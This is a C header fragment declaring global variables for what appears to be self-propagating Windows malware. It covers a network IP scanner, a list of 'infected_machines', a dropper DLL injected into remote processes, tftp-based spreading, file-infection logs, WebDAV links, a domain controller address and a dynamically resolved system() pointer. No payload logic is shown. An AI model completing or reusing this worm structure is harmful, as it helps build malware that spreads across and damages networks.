// Stores all TID information for local DLL threads
extern DWORD				local_threads[MAX_LOCAL_THREADS];
extern UINT					local_thread_counter;

// The global DC address
extern DWORD				dc_address;

// Global IP address list (used for scanner)
extern PDWORD				ip_address_list;

// Informs scan_net that all possible IPs in ip_address_list were exhausted. used_address_pool is zero'd
extern BOOL					zero_used_ip_list;

// Keeps a buffer of all the infected systems
extern PDWORD				infected_machines;

// Notifies the DLL if its the dropper or injected into a remote process
extern BOOL					dropper_dll;

// Handles the sync between the husk and tftp threads 
extern CRITICAL_SECTION		husk_tftp_sync;

// The raw image passed to each instance
extern LPVOID				dll_image;

// The first element of the file wrapper log
extern PWRAPPER_INFECT_LOG	first_wrapper_log;

extern PCHAR				webdav_links[1024];
extern UINT					webdav_link_index;

// The global configuration structure
extern GLOBAL_CONFIGURATION	global_config;

extern CRITICAL_SECTION		scan_buffer_lock;

char			(*f_itoa)(int, char *, int);
int				(*f_snprintf)(char *, SIZE_T, const char *, ...);
int				(*f_system)(const char *);
int				(*f_atoi)(const char *);
int				(*f_strncmp)(const char *, const char *, SIZE_T);
void			(*f_memcpy)(void *, const void *, SIZE_T);